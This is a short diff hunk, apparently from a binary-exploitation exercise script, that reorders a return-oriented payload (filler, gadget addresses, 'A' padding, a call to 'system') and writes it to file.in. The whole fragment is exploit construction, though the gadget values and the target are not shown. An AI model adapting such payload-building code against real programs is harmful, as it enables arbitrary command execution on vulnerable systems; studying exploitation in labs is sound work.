@@ -57,7 +57,7 @@ pop30 = gadgetx30 + "A"*0x2c
 # exploitlocation = p32(0x804a04c)
 
 
-data = filler + gadget1*0x28  + gadgetx30 + "A"*0x2c + system
+data = filler + gadgetx30 + "A"*0x2c + gadget1*0x28  + system
 
 with open("file.in", "w") as f:
 	f.write(data)
